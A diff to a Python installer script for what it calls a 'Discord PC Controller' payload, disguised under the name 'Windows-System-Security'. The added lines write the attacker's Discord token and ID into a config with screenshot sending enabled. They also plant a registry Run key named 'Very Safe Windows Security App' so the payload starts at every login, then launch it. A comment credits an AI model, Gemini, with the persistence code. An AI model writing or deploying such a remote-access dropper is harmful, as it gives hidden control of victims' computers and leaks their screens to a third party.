@@ -1,5 +1,7 @@
 #Imports
 from subprocess import run #To run commands in cmd
+import winreg #Modify registry to always run on startup
+from os import getcwd, chdir #To get file path for exe
 
 #Method to run commands and handle errors
 def installStep(command):
@@ -24,8 +26,16 @@ installStep("Remove-Item -Path Windows-System-Security/Windows-Defender-C.zip -F
 #NOTE: When creating your payload, make sure to put YOUR Discord ID and token, then compress it to an .EXE file
 #Check README.md for more information
 with open("Windows-System-Security\Discord PC Controller\.env", "w") as f:
-	f.write("DISCORD_TOKEN=ENTERYOURTOKENHERE\n")
-	f.write("DISCORD_ID=ENTERYOURIDHERE\n")
+	f.write("DISCORD_TOKEN=YOURTOKENHERE\n")
+	f.write("DISCORD_ID=YOURIDHERE\n")
 	f.write("SEND_SCREENSHOT=True")
 
-#Step 6: Make sure the app runs on startup
+#Step 6: Make sure the app runs on startup (NOTE: Gemini helped me with this part)
+regKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
+workDir = getcwd()
+winreg.SetValueEx(regKey, "Very Safe Windows Security App", 0, winreg.REG_SZ, workDir + "\Windows-System-Security\Discord PC Controller\Discord PC Controller.exe")
+winreg.CloseKey(regKey)
+
+#Step 7: Start the app
+chdir("Windows-System-Security\Discord PC Controller")
+installStep("start 'Discord PC Controller.exe'")
